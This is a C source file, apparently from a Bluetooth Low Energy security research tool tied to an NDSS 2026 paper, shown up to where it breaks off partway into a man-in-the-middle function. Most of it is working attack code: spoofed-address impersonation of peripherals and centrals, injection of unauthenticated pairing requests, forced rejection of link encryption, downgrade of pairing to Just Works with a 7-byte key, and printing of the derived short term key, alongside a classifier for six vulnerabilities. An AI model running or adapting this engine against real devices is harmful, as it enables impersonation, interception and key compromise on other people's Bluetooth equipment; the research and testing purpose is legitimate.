// ========================================
//  nom du fichier: blerp_attack.c
//  description courte: BLERP native attack engine (NDSS 2026).
//  Implements Peripheral Impersonation (PI), Central Impersonation (CI),
//  MitM downgrade proxy, and full V1-V6 vulnerability evaluation.
//  dernière modification : 2026-10-04
//  auteur: GitHub/@gGaToRr
// ========================================

#define _GNU_SOURCE

#include "blerp_attack.h"
#include "mgmt.h"
#include "../ui.h"
#include "../smp.h" // SMP_CODE_* opcodes
#include "../wire/hci_wire.h"
#include "../wire/hci_user_channel.h"

#include <errno.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <unistd.h>
#include <openssl/rand.h>

#define SMP_CID_VAL             0x0006
#define SMP_OP_PAIRING_REQ      SMP_CODE_PAIRING_REQUEST
#define SMP_OP_PAIRING_RSP      SMP_CODE_PAIRING_RESPONSE
#define SMP_OP_PAIRING_CONFIRM  0x03
#define SMP_OP_PAIRING_RANDOM   0x04
#define SMP_OP_PAIRING_FAIL     SMP_CODE_PAIRING_FAILED
#define SMP_OP_SECURITY_REQ     SMP_CODE_SECURITY_REQUEST
#define SMP_OP_PUBLIC_KEY       0x0c

// Return standard vulnerability code.
const char *blerp_vuln_code(enum blerp_vuln v) {
    switch (v) {
    case BLERP_V1_UNAUTH_SECREQ:       return "V1";
    case BLERP_V2_UNAUTH_REPAIR:       return "V2";
    case BLERP_V3_PERIPHERAL_DOWNGRADE: return "V3";
    case BLERP_V4_LEVEL_DOWNGRADE:     return "V4";
    case BLERP_V5_SESSION_BREAK:       return "V5";
    case BLERP_V6_ENTROPY_DOWNGRADE:   return "V6";
    default: return "V?";
    }
}

// Return human-readable vulnerability title.
const char *blerp_vuln_title(enum blerp_vuln v) {
    switch (v) {
    case BLERP_V1_UNAUTH_SECREQ:
        return "Central accepts unauthenticated Security Request";
    case BLERP_V2_UNAUTH_REPAIR:
        return "Peripheral accepts unauthenticated Pairing Request on bond";
    case BLERP_V3_PERIPHERAL_DOWNGRADE:
        return "Peripheral requests high security then downgrades in response";
    case BLERP_V4_LEVEL_DOWNGRADE:
        return "Re-pairing proceeds below stored bond security level";
    case BLERP_V5_SESSION_BREAK:
        return "Victim falls back to re-pairing after rejected encryption";
    case BLERP_V6_ENTROPY_DOWNGRADE:
        return "Encryption key entropy reduced below stored bond";
    default:
        return "Unknown BLERP vulnerability";
    }
}

// Initialize attack configuration.
void blerp_config_init(struct blerp_attack_config *cfg, enum blerp_attack_type type) {
    if (!cfg) return;
    memset(cfg, 0, sizeof *cfg);
    cfg->type = type;
    cfg->dev_id = 0;
    cfg->dev_id_sec = 1;
    cfg->target_type = 1; // Public
    cfg->spoof_type = 2;  // Random
    strncpy(cfg->adv_name, "BLEURP Attack", sizeof(cfg->adv_name) - 1);
    cfg->appearance = 0x03C0; // HID Generic
    cfg->reject_enc = (type == BLERP_ATTACK_PI);
    cfg->send_secreq = false;
    cfg->sec_req_authreq = 0x0d;     // MITM=1, SC=1, Bond=1
    cfg->downgraded_authreq = 0x01;  // MITM=0, SC=0, Bond=1 (Just Works)
    cfg->downgraded_keysize = 7;     // Minimum 56-bit key
    cfg->wait_conn_ms = 60000;
    cfg->wait_react_ms = 10000;
}

// Construct advertising payload containing Flags, Complete Name, and Appearance.
size_t blerp_build_adv_data(const char *name, uint16_t appearance, uint8_t *out, size_t max) {
    if (!out || max < 3) return 0;
    size_t off = 0;

    // Flags: LE General Discoverable, BR/EDR Not Supported
    out[off++] = 0x02;
    out[off++] = 0x01;
    out[off++] = 0x06;

    // Appearance (if specified)
    if (appearance != 0) {
        if (off + 4 > max) return 0;
        out[off++] = 0x03;
        out[off++] = 0x19; // Appearance AD type
        out[off++] = (uint8_t)(appearance & 0xff);
        out[off++] = (uint8_t)(appearance >> 8);
    }

    // Complete Local Name
    if (name && strlen(name) > 0) {
        size_t nlen = strlen(name);
        if (off + 2 + nlen > max) {
            nlen = max - off - 2;
        }
        out[off++] = (uint8_t)(nlen + 1);
        out[off++] = 0x09; // Complete Local Name AD type
        memcpy(&out[off], name, nlen);
        off += nlen;
    }
    return off;
}

// Rewrite a 7-byte Pairing Request PDU to force downgraded parameters.
int blerp_rewrite_preq(const uint8_t in[7], uint8_t out[7],
                       uint8_t forced_authreq, uint8_t forced_keysize) {
    if (!in || !out || in[0] != SMP_OP_PAIRING_REQ) return -1;
    memcpy(out, in, 7);
    if (forced_authreq != 0) {
        out[3] = forced_authreq;
    }
    if (forced_keysize != 0) {
        if (out[4] > forced_keysize) out[4] = forced_keysize;
    }
    return 7;
}

// Rewrite a 7-byte Pairing Response PDU to force downgraded parameters.
int blerp_rewrite_pres(const uint8_t in[7], uint8_t out[7],
                       uint8_t forced_authreq, uint8_t forced_keysize) {
    if (!in || !out || in[0] != SMP_OP_PAIRING_RSP) return -1;
    memcpy(out, in, 7);
    if (forced_authreq != 0) {
        out[3] = forced_authreq;
    }
    if (forced_keysize != 0) {
        if (out[4] > forced_keysize) out[4] = forced_keysize;
    }
    return 7;
}

// Classify all 6 vulnerabilities based on attack report and stored bond.
void blerp_classify_vulnerabilities(const struct smp_bond_info *bond,
                                    const struct blerp_attack_report *raw,
                                    struct blerp_attack_report *out) {
    if (!raw || !out) return;
    if (out != raw) memcpy(out, raw, sizeof *out);

    for (int i = 0; i < BLERP_VULN_COUNT; i++) {
        out->verdicts[i] = BLERP_VERDICT_INCONCLUSIVE;
        out->vuln_details[i][0] = '\0';
    }

    if (!raw->connected) {
        for (int i = 0; i < BLERP_VULN_COUNT; i++) {
            snprintf(out->vuln_details[i], sizeof(out->vuln_details[i]),
                     "No Link Layer connection established");
        }
        return;
    }

    // V1: Central accepts unauthenticated Security Request
    if (raw->secreq_sent) {
        if (raw->preq_received) {
            out->verdicts[BLERP_V1_UNAUTH_SECREQ] = BLERP_VERDICT_YES;
            snprintf(out->vuln_details[BLERP_V1_UNAUTH_SECREQ],
                     sizeof(out->vuln_details[BLERP_V1_UNAUTH_SECREQ]),
                     "Central triggered Pairing Request upon unauthenticated Security Request");
        } else {
            out->verdicts[BLERP_V1_UNAUTH_SECREQ] = BLERP_VERDICT_NO;
            snprintf(out->vuln_details[BLERP_V1_UNAUTH_SECREQ],
                     sizeof(out->vuln_details[BLERP_V1_UNAUTH_SECREQ]),
                     "Central ignored unauthenticated Security Request");
        }
    } else {
        snprintf(out->vuln_details[BLERP_V1_UNAUTH_SECREQ],
                 sizeof(out->vuln_details[BLERP_V1_UNAUTH_SECREQ]),
                 "Security Request was not tested in this run");
    }

    // V2: Peripheral accepts unauthenticated Pairing Request on bond
    if (raw->preq_sent) {
        if (raw->pres_received) {
            out->verdicts[BLERP_V2_UNAUTH_REPAIR] = BLERP_VERDICT_YES;
            snprintf(out->vuln_details[BLERP_V2_UNAUTH_REPAIR],
                     sizeof(out->vuln_details[BLERP_V2_UNAUTH_REPAIR]),
                     "Peripheral accepted Pairing Request on bonded device without authentication");
        } else if (raw->pairing_failed) {
            out->verdicts[BLERP_V2_UNAUTH_REPAIR] = BLERP_VERDICT_NO;
            snprintf(out->vuln_details[BLERP_V2_UNAUTH_REPAIR],
                     sizeof(out->vuln_details[BLERP_V2_UNAUTH_REPAIR]),
                     "Peripheral rejected Pairing Request (reason 0x%02x)", raw->fail_reason);
        } else {
            snprintf(out->vuln_details[BLERP_V2_UNAUTH_REPAIR],
                     sizeof(out->vuln_details[BLERP_V2_UNAUTH_REPAIR]),
                     "No reply to Pairing Request");
        }
    }

    // V3: Peripheral requests high security then downgrades in response
    if (raw->pres_sent && (raw->preq_received || raw->pres_received)) {
        if (raw->phase2_completed) {
            out->verdicts[BLERP_V3_PERIPHERAL_DOWNGRADE] = BLERP_VERDICT_YES;
            snprintf(out->vuln_details[BLERP_V3_PERIPHERAL_DOWNGRADE],
                     sizeof(out->vuln_details[BLERP_V3_PERIPHERAL_DOWNGRADE]),
                     "Central completed handshake after peripheral downgraded parameters");
        } else if (raw->pairing_failed && raw->fail_reason == 0x03) {
            out->verdicts[BLERP_V3_PERIPHERAL_DOWNGRADE] = BLERP_VERDICT_NO;
            snprintf(out->vuln_details[BLERP_V3_PERIPHERAL_DOWNGRADE],
                     sizeof(out->vuln_details[BLERP_V3_PERIPHERAL_DOWNGRADE]),
                     "Central aborted pairing on downgraded AuthReq (Authentication Requirements 0x03)");
        }
    }

    // V4: Level downgrade below ARPK (bond)
    if (bond) {
        if (bond->authenticated) {
            bool final_mitm = (raw->negotiated_authreq & 0x04) != 0;
            if (raw->phase2_completed && !final_mitm) {
                out->verdicts[BLERP_V4_LEVEL_DOWNGRADE] = BLERP_VERDICT_YES;
                snprintf(out->vuln_details[BLERP_V4_LEVEL_DOWNGRADE],
                         sizeof(out->vuln_details[BLERP_V4_LEVEL_DOWNGRADE]),
                         "Bond required MITM, but re-pairing succeeded without MITM (Just Works)");
            } else if (raw->pairing_failed && raw->fail_reason == 0x03) {
                out->verdicts[BLERP_V4_LEVEL_DOWNGRADE] = BLERP_VERDICT_NO;
                snprintf(out->vuln_details[BLERP_V4_LEVEL_DOWNGRADE],
                         sizeof(out->vuln_details[BLERP_V4_LEVEL_DOWNGRADE]),
                         "Peer rejected re-pairing below authenticated bond level");
            } else if (raw->phase2_completed && final_mitm) {
                out->verdicts[BLERP_V4_LEVEL_DOWNGRADE] = BLERP_VERDICT_NO;
                snprintf(out->vuln_details[BLERP_V4_LEVEL_DOWNGRADE],
                         sizeof(out->vuln_details[BLERP_V4_LEVEL_DOWNGRADE]),
                         "Re-pairing maintained authenticated security level");
            }
        } else {
            snprintf(out->vuln_details[BLERP_V4_LEVEL_DOWNGRADE],
                     sizeof(out->vuln_details[BLERP_V4_LEVEL_DOWNGRADE]),
                     "Initial bond was not authenticated (MITM not present in bond)");
        }
    } else {
        snprintf(out->vuln_details[BLERP_V4_LEVEL_DOWNGRADE],
                 sizeof(out->vuln_details[BLERP_V4_LEVEL_DOWNGRADE]),
                 "No baseline bond provided to evaluate ARPK downgrade");
    }

    // V5: Victim falls back to re-pairing after encryption rejected
    if (raw->enc_rejected) {
        if (raw->preq_received || raw->phase2_completed) {
            out->verdicts[BLERP_V5_SESSION_BREAK] = BLERP_VERDICT_YES;
            snprintf(out->vuln_details[BLERP_V5_SESSION_BREAK],
                     sizeof(out->vuln_details[BLERP_V5_SESSION_BREAK]),
                     "Victim initiated unauthenticated re-pairing following LL_REJECT_IND");
        } else {
            out->verdicts[BLERP_V5_SESSION_BREAK] = BLERP_VERDICT_NO;
            snprintf(out->vuln_details[BLERP_V5_SESSION_BREAK],
                     sizeof(out->vuln_details[BLERP_V5_SESSION_BREAK]),
                     "Victim disconnected or aborted following LL_REJECT_IND (mitigated)");
        }
    } else {
        snprintf(out->vuln_details[BLERP_V5_SESSION_BREAK],
                 sizeof(out->vuln_details[BLERP_V5_SESSION_BREAK]),
                 "Encryption rejection was not triggered");
    }

    // V6: Key entropy reduced below stored bond
    if (bond && bond->enc_size > 0) {
        if (raw->phase2_completed && raw->negotiated_keysize < bond->enc_size) {
            out->verdicts[BLERP_V6_ENTROPY_DOWNGRADE] = BLERP_VERDICT_YES;
            snprintf(out->vuln_details[BLERP_V6_ENTROPY_DOWNGRADE],
                     sizeof(out->vuln_details[BLERP_V6_ENTROPY_DOWNGRADE]),
                     "Key size downgraded to %d bytes (bond was %d bytes)",
                     raw->negotiated_keysize, bond->enc_size);
        } else if (raw->pairing_failed && raw->fail_reason == 0x06) {
            out->verdicts[BLERP_V6_ENTROPY_DOWNGRADE] = BLERP_VERDICT_NO;
            snprintf(out->vuln_details[BLERP_V6_ENTROPY_DOWNGRADE],
                     sizeof(out->vuln_details[BLERP_V6_ENTROPY_DOWNGRADE]),
                     "Peer rejected reduced key size (Encryption Key Size reason 0x06)");
        } else if (raw->phase2_completed) {
            out->verdicts[BLERP_V6_ENTROPY_DOWNGRADE] = BLERP_VERDICT_NO;
            snprintf(out->vuln_details[BLERP_V6_ENTROPY_DOWNGRADE],
                     sizeof(out->vuln_details[BLERP_V6_ENTROPY_DOWNGRADE]),
                     "Key size %d bytes maintained baseline bond entropy", raw->negotiated_keysize);
        }
    } else if (raw->phase2_completed && raw->negotiated_keysize <= 7) {
        out->verdicts[BLERP_V6_ENTROPY_DOWNGRADE] = BLERP_VERDICT_YES;
        snprintf(out->vuln_details[BLERP_V6_ENTROPY_DOWNGRADE],
                 sizeof(out->vuln_details[BLERP_V6_ENTROPY_DOWNGRADE]),
                 "Negotiated minimum 7-byte key entropy (KNOB vulnerable)");
    }
}

// Execute Peripheral Impersonation attack over HCI User Channel.
int blerp_run_pi(const struct blerp_attack_config *cfg, struct blerp_attack_report *rep) {
    if (!cfg || !rep) return -1;
    memset(rep, 0, sizeof *rep);

    int fd = hci_user_channel_open(cfg->dev_id);
    if (fd < 0) return -1;

    hci_user_channel_send_cmd(fd, HCI_OP_RESET, NULL, 0);
    usleep(80000);

    uint8_t le_mask[8] = { 0xff, 0x1f, 0x0a, 0x03, 0, 0, 0, 0 };
    hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_EVENT_MASK, le_mask, 8);

    uint8_t own_addr_type = 0x00; // Public
    static const uint8_t zero_addr[6] = {0};
    if (memcmp(cfg->spoof_addr, zero_addr, 6) != 0) {
        hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_RANDOM_ADDR, cfg->spoof_addr, 6);
        own_addr_type = 0x01; // Random
        printf("  [*] Peripheral address spoofed to: %02X:%02X:%02X:%02X:%02X:%02X\n",
               cfg->spoof_addr[5], cfg->spoof_addr[4], cfg->spoof_addr[3],
               cfg->spoof_addr[2], cfg->spoof_addr[1], cfg->spoof_addr[0]);
    }

    uint8_t adv_raw[31];
    size_t adv_len = blerp_build_adv_data(cfg->adv_name, cfg->appearance, adv_raw, sizeof adv_raw);
    uint8_t adv_data[32];
    memset(adv_data, 0, sizeof adv_data);
    adv_data[0] = (uint8_t)adv_len;
    memcpy(&adv_data[1], adv_raw, adv_len);

    uint8_t adv_params[15] = {
        0x30, 0x00, 0x30, 0x00, // 30ms interval
        0x00,                   // ADV_IND
        own_addr_type,
        0x00, 0, 0, 0, 0, 0, 0,
        0x07, 0x00
    };
    hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_ADV_PARAMS, adv_params, sizeof adv_params);
    hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_ADV_DATA, adv_data, sizeof adv_data);

    uint8_t enable = 0x01;
    hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_ADV_ENABLE, &enable, 1);
    printf("  [*] Malicious peripheral advertising active. Awaiting victim Central connection...\n");

    uint16_t handle = 0;
    bool connected = false;
    struct timeval start, now;
    gettimeofday(&start, NULL);

    while (!connected) {
        gettimeofday(&now, NULL);
        long elapsed = (now.tv_sec - start.tv_sec) * 1000 + (now.tv_usec - start.tv_usec) / 1000;
        int remaining = cfg->wait_conn_ms - (int)elapsed;
        if (remaining <= 0) break;

        struct pollfd pfd = { .fd = fd, .events = POLLIN, .revents = 0 };
        if (poll(&pfd, 1, remaining) <= 0) break;

        uint8_t pkt[1024];
        ssize_t n = read(fd, pkt, sizeof pkt);
        if (n < 8 || pkt[0] != HCI_EVENT_PKT || pkt[1] != HCI_EV_LE_META) continue;
        uint8_t sub = pkt[3];
        if ((sub == HCI_SUBEVT_LE_CONN_COMPLETE || sub == HCI_SUBEVT_LE_CONN_COMPLETE_ENH) &&
            pkt[4] == 0x00 && pkt[7] == 0x01) {
            handle = (uint16_t)((pkt[5] | (pkt[6] << 8)) & 0x0fff);
            connected = true;
        }
    }

    if (!connected) {
        uint8_t off = 0x00;
        hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_ADV_ENABLE, &off, 1);
        hci_user_channel_close(fd, cfg->dev_id);
        return 0;
    }
    rep->connected = true;
    printf("  %s[+] Central connected (handle 0x%04x).%s\n", UI_GREEN, handle, UI_RESET);

    // V5: Intercept encryption request and send LL_REJECT_IND
    if (cfg->reject_enc) {
        gettimeofday(&start, NULL);
        while (1) {
            gettimeofday(&now, NULL);
            long elapsed = (now.tv_sec - start.tv_sec) * 1000 + (now.tv_usec - start.tv_usec) / 1000;
            int rem = 3000 - (int)elapsed;
            if (rem <= 0) break;

            struct pollfd pfd = { .fd = fd, .events = POLLIN, .revents = 0 };
            if (poll(&pfd, 1, rem) <= 0) break;

            uint8_t pkt[512];
            ssize_t n = read(fd, pkt, sizeof pkt);
            if (n >= 4 && pkt[0] == HCI_EVENT_PKT && pkt[1] == HCI_EV_LE_META &&
                pkt[3] == HCI_SUBEVT_LE_LTK_REQUEST) {
                uint8_t neg[2] = { (uint8_t)(handle & 0xff), (uint8_t)(handle >> 8) };
                hci_user_channel_send_cmd(fd, HCI_OP_LE_LTK_NEG_REPLY, neg, sizeof neg);
                rep->enc_rejected = true;
                printf("  %s[*] Session encryption request rejected (LL_REJECT_IND, V5).%s\n",
                       UI_PINK, UI_RESET);
                break;
            }
        }
    }

    // Optional Security Request
    if (cfg->send_secreq) {
        uint8_t sreq[2] = { SMP_OP_SECURITY_REQ, cfg->sec_req_authreq };
        hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, sreq, sizeof sreq);
        rep->secreq_sent = true;
        printf("  [*] Sent unauthenticated Security Request (AuthReq=0x%02x, V1).\n",
               cfg->sec_req_authreq);
    }

    // SMP Legacy Just Works engine for responder
    struct smp_legacy leg;
    uint8_t my_rand[16];
    if (RAND_bytes(my_rand, 16) != 1) memset(my_rand, 0x42, 16);
    uint8_t dummy_ia[6] = {0}, dummy_ra[6] = {0};
    smp_legacy_init(&leg, false, 0, dummy_ia, own_addr_type, dummy_ra, my_rand);
    smp_legacy_set_params(&leg, cfg->downgraded_authreq, cfg->downgraded_keysize);

    gettimeofday(&start, NULL);
    bool answered_req = false;
    bool answered_confirm = false;

    while (1) {
        gettimeofday(&now, NULL);
        long elapsed = (now.tv_sec - start.tv_sec) * 1000 + (now.tv_usec - start.tv_usec) / 1000;
        int remaining = cfg->wait_react_ms - (int)elapsed;
        if (remaining <= 0) break;

        struct pollfd pfd = { .fd = fd, .events = POLLIN, .revents = 0 };
        if (poll(&pfd, 1, remaining) <= 0) break;

        uint8_t pkt[1024];
        ssize_t n = read(fd, pkt, sizeof pkt);
        if (n < 2) continue;

        if (pkt[0] == HCI_ACLDATA_PKT && n >= 10) {
            uint16_t cid = (uint16_t)(pkt[7] | (pkt[8] << 8));
            if (cid != SMP_CID_VAL) continue;
            uint8_t op = pkt[9];

            if (op == SMP_OP_PAIRING_REQ && !answered_req) {
                rep->preq_received = true;
                printf("  [SMP REQ] Received Pairing Request from Central (AuthReq=0x%02x, MaxKey=%d)\n",
                       pkt[12], pkt[13]);
                (void)smp_legacy_on_req(&leg, &pkt[9]);

                uint8_t pres[7];
                smp_legacy_make_rsp(&leg, pres);
                hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, pres, 7);
                rep->pres_sent = true;
                answered_req = true;
                rep->negotiated_authreq = pres[3];
                rep->negotiated_keysize = pres[4];
                printf("  [SMP RSP] Sent downgraded Pairing Response (AuthReq=0x%02x, KeySize=%d, V3/V4/V6)\n",
                       pres[3], pres[4]);
            } else if (op == SMP_OP_PAIRING_CONFIRM && !answered_confirm) {
                printf("  [SMP] Received Pairing Confirm from Central (16 bytes)\n");
                (void)smp_legacy_on_confirm(&leg, &pkt[9]);

                uint8_t sconfirm[17];
                smp_legacy_make_confirm(&leg, sconfirm);
                hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, sconfirm, 17);
                answered_confirm = true;
                printf("  [SMP] Sent Pairing Confirm (16 bytes)\n");
            } else if (op == SMP_OP_PAIRING_RANDOM) {
                printf("  [SMP] Received Pairing Random from Central (16 bytes)\n");
                (void)smp_legacy_on_random(&leg, &pkt[9]);

                uint8_t srandom[17];
                smp_legacy_make_random(&leg, srandom);
                hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, srandom, 17);
                printf("  [SMP] Sent Pairing Random (16 bytes)\n");

                if (leg.done && !leg.failed) {
                    rep->phase2_completed = true;
                    memcpy(rep->stk, leg.stk, 16);
                    printf("  %s[+] Phase 2 SMP completed! Short Term Key derived successfully.%s\n",
                           UI_GREEN, UI_RESET);
                    printf("  [KEY] STK: ");
                    for (int k = 0; k < 16; k++) printf("%02x", rep->stk[k]);
                    printf("\n");
                    break;
                }
            } else if (op == SMP_OP_PAIRING_FAIL) {
                rep->pairing_failed = true;
                rep->fail_reason = (n >= 11) ? pkt[10] : 0;
                printf("  %s[!] Central aborted pairing (Pairing Failed, reason 0x%02x)%s\n",
                       UI_RED, rep->fail_reason, UI_RESET);
                break;
            }
        } else if (pkt[0] == HCI_EVENT_PKT && pkt[1] == HCI_EV_DISCONN_COMPL) {
            printf("  [-] Central disconnected.\n");
            break;
        }
    }

    uint8_t disc[3] = { (uint8_t)(handle & 0xff), (uint8_t)(handle >> 8), 0x13 };
    hci_user_channel_send_cmd(fd, HCI_OP_DISCONNECT, disc, 3);
    usleep(20000);
    uint8_t off = 0x00;
    hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_ADV_ENABLE, &off, 1);
    hci_user_channel_close(fd, cfg->dev_id);
    return 0;
}

// Execute Central Impersonation attack over HCI User Channel.
int blerp_run_ci(const struct blerp_attack_config *cfg, struct blerp_attack_report *rep) {
    if (!cfg || !rep) return -1;
    memset(rep, 0, sizeof *rep);

    int fd = hci_user_channel_open(cfg->dev_id);
    if (fd < 0) return -1;

    hci_user_channel_send_cmd(fd, HCI_OP_RESET, NULL, 0);
    usleep(80000);

    uint8_t le_mask[8] = { 0xff, 0x1f, 0x0a, 0x03, 0, 0, 0, 0 };
    hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_EVENT_MASK, le_mask, 8);

    uint8_t own_addr_type = 0x00; // Public
    static const uint8_t zero_addr[6] = {0};
    if (memcmp(cfg->spoof_addr, zero_addr, 6) != 0) {
        hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_RANDOM_ADDR, cfg->spoof_addr, 6);
        own_addr_type = 0x01; // Random
        printf("  [*] Central address spoofed to: %02X:%02X:%02X:%02X:%02X:%02X\n",
               cfg->spoof_addr[5], cfg->spoof_addr[4], cfg->spoof_addr[3],
               cfg->spoof_addr[2], cfg->spoof_addr[1], cfg->spoof_addr[0]);
    }

    // Connect to victim Peripheral
    uint8_t conn_params[25];
    memset(conn_params, 0, sizeof conn_params);
    conn_params[0] = 0x60; conn_params[1] = 0x00; // Scan interval 60ms
    conn_params[2] = 0x60; conn_params[3] = 0x00; // Scan window 60ms (100% duty cycle, no missed advs)
    conn_params[4] = 0x00; // Filter policy
    conn_params[5] = (cfg->target_type == 2) ? 0x01 : 0x00; // Peer address type
    memcpy(&conn_params[6], cfg->target_addr, 6);
    conn_params[12] = own_addr_type;
    conn_params[13] = 0x18; conn_params[14] = 0x00; // Min interval 30ms
    conn_params[15] = 0x28; conn_params[16] = 0x00; // Max interval 50ms
    conn_params[17] = 0x00; conn_params[18] = 0x00; // Latency
    conn_params[19] = 0xf4; conn_params[20] = 0x01; // Supervision timeout 5000ms (resilient link)

    printf("  [*] Connecting to victim Peripheral %02X:%02X:%02X:%02X:%02X:%02X...\n",
           cfg->target_addr[5], cfg->target_addr[4], cfg->target_addr[3],
           cfg->target_addr[2], cfg->target_addr[1], cfg->target_addr[0]);
    hci_user_channel_send_cmd(fd, HCI_OP_LE_CREATE_CONN, conn_params, 25);

    uint16_t handle = 0;
    bool connected = false;
    struct timeval start, now;
    gettimeofday(&start, NULL);

    while (!connected) {
        gettimeofday(&now, NULL);
        long elapsed = (now.tv_sec - start.tv_sec) * 1000 + (now.tv_usec - start.tv_usec) / 1000;
        int rem = cfg->wait_conn_ms - (int)elapsed;
        if (rem <= 0) break;

        struct pollfd pfd = { .fd = fd, .events = POLLIN, .revents = 0 };
        if (poll(&pfd, 1, rem) <= 0) break;

        uint8_t pkt[1024];
        ssize_t n = read(fd, pkt, sizeof pkt);
        if (n < 8 || pkt[0] != HCI_EVENT_PKT || pkt[1] != HCI_EV_LE_META) continue;
        uint8_t sub = pkt[3];
        if ((sub == HCI_SUBEVT_LE_CONN_COMPLETE || sub == HCI_SUBEVT_LE_CONN_COMPLETE_ENH) && pkt[4] == 0x00) {
            handle = (uint16_t)((pkt[5] | (pkt[6] << 8)) & 0x0fff);
            connected = true;
        }
    }

    if (!connected) {
        hci_user_channel_send_cmd(fd, HCI_OP_LE_CREATE_CONN_CANCEL, NULL, 0);
        hci_user_channel_close(fd, cfg->dev_id);
        return 0;
    }
    rep->connected = true;
    printf("  %s[+] Connected to Peripheral (handle 0x%04x).%s\n", UI_GREEN, handle, UI_RESET);

    // V2: Immediately inject unauthenticated Pairing Request without session establishment
    struct smp_legacy leg;
    uint8_t my_rand[16];
    if (RAND_bytes(my_rand, 16) != 1) memset(my_rand, 0x42, 16);
    smp_legacy_init(&leg, true, own_addr_type, cfg->spoof_addr, cfg->target_type - 1,
                    cfg->target_addr, my_rand);
    smp_legacy_set_params(&leg, cfg->downgraded_authreq, cfg->downgraded_keysize);

    uint8_t preq[7];
    smp_legacy_make_req(&leg, preq);
    hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, preq, 7);
    rep->preq_sent = true;
    printf("  [SMP REQ] Injected unauthenticated Pairing Request (AuthReq=0x%02x, KeySize=%d, V2/V4/V6)\n",
           preq[3], preq[4]);

    gettimeofday(&start, NULL);
    bool sent_confirm = false;

    while (1) {
        gettimeofday(&now, NULL);
        long elapsed = (now.tv_sec - start.tv_sec) * 1000 + (now.tv_usec - start.tv_usec) / 1000;
        int rem = cfg->wait_react_ms - (int)elapsed;
        if (rem <= 0) break;

        struct pollfd pfd = { .fd = fd, .events = POLLIN, .revents = 0 };
        if (poll(&pfd, 1, rem) <= 0) break;

        uint8_t pkt[1024];
        ssize_t n = read(fd, pkt, sizeof pkt);
        if (n < 2) continue;

        if (pkt[0] == HCI_ACLDATA_PKT && n >= 10) {
            uint16_t cid = (uint16_t)(pkt[7] | (pkt[8] << 8));
            if (cid != SMP_CID_VAL) continue;
            uint8_t op = pkt[9];

            if (op == SMP_OP_PAIRING_RSP) {
                rep->pres_received = true;
                rep->negotiated_authreq = pkt[12];
                rep->negotiated_keysize = pkt[13];
                printf("  [SMP RSP] Peripheral accepted re-pairing! (AuthReq=0x%02x, MaxKey=%d, V2)\n",
                       pkt[12], pkt[13]);
                (void)smp_legacy_on_rsp(&leg, &pkt[9]);

                uint8_t mconfirm[17];
                smp_legacy_make_confirm(&leg, mconfirm);
                hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, mconfirm, 17);
                sent_confirm = true;
                printf("  [SMP] Sent Pairing Confirm (16 bytes)\n");
            } else if (op == SMP_OP_PAIRING_CONFIRM && sent_confirm) {
                printf("  [SMP] Received Pairing Confirm from Peripheral (16 bytes)\n");
                (void)smp_legacy_on_confirm(&leg, &pkt[9]);

                uint8_t mrandom[17];
                smp_legacy_make_random(&leg, mrandom);
                hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, mrandom, 17);
                printf("  [SMP] Sent Pairing Random (16 bytes)\n");
            } else if (op == SMP_OP_PAIRING_RANDOM) {
                printf("  [SMP] Received Pairing Random from Peripheral (16 bytes)\n");
                (void)smp_legacy_on_random(&leg, &pkt[9]);

                if (leg.done && !leg.failed) {
                    rep->phase2_completed = true;
                    memcpy(rep->stk, leg.stk, 16);
                    printf("  %s[+] Phase 2 SMP completed! Short Term Key derived successfully.%s\n",
                           UI_GREEN, UI_RESET);
                    printf("  [KEY] STK: ");
                    for (int k = 0; k < 16; k++) printf("%02x", rep->stk[k]);
                    printf("\n");
                    break;
                }
            } else if (op == SMP_OP_PAIRING_FAIL) {
                rep->pairing_failed = true;
                rep->fail_reason = (n >= 11) ? pkt[10] : 0;
                printf("  %s[!] Peripheral rejected re-pairing (Pairing Failed, reason 0x%02x)%s\n",
                       UI_RED, rep->fail_reason, UI_RESET);
                break;
            }
        } else if (pkt[0] == HCI_EVENT_PKT && pkt[1] == HCI_EV_DISCONN_COMPL) {
            printf("  [-] Peripheral disconnected.\n");
            break;
        }
    }

    uint8_t disc[3] = { (uint8_t)(handle & 0xff), (uint8_t)(handle >> 8), 0x13 };
    hci_user_channel_send_cmd(fd, HCI_OP_DISCONNECT, disc, 3);
    hci_user_channel_close(fd, cfg->dev_id);
    return 0;
}

// One side of the double-channel MitM, run on its own thread so the PI and CI
// sub-attacks proceed concurrently instead of one after the other.
struct blerp_mitm_side {
    const struct blerp_attack_config *cfg;
    struct blerp_attack_report *rep;
    int (*run)(const struct blerp_attack_config *, struct blerp_attack_report *);
    int rc; // set by blerp_mitm_thread_main once run() returns
};

static void *blerp_mitm_thread_main(void *arg) {
    struct blerp_mitm_side *side = (struct blerp_mitm_side *)arg;
    side->rc = side->run(side->cfg, side->rep);
    return NULL;
}

// Execute the BLERP double-channel MitM attack. See blerp_attack.h for the contract.
int blerp_run_mitm(const struct blerp_attack_config *cfg, struct blerp_attack_report *rep) {
    if (!cfg || !rep) return -1;
    memset(rep, 0, sizeof *rep);

    static const uint8_t zero_addr[6] = {0};
    if (memcmp(cfg->target_addr, zero_addr, 6) == 0) {
        fprintf(stderr, "  [-] Double-channel MitM requires the victim Peripheral's address: it is "
                         "both the CI connection target and the PI spoofed identity.\n");
        return -1;
    }
    if (cfg->dev_id == cfg->dev_id_sec) {
        fprintf(stderr, "  [-] Double-channel MitM requires two distinct HCI adapters "
                         "(-i and -j must differ; got hci%d for both).\n", cfg->dev_id);
        return -1;
    }

    // PI side: impersonate the victim Peripheral (cfg->target_addr) to the
    // victim Central, on the primary adapter. blerp_run_pi never reads
    // target_addr itself (it only advertises under spoof_addr and waits for a
    // Central to connect), so it is cleared here to avoid implying otherwise.
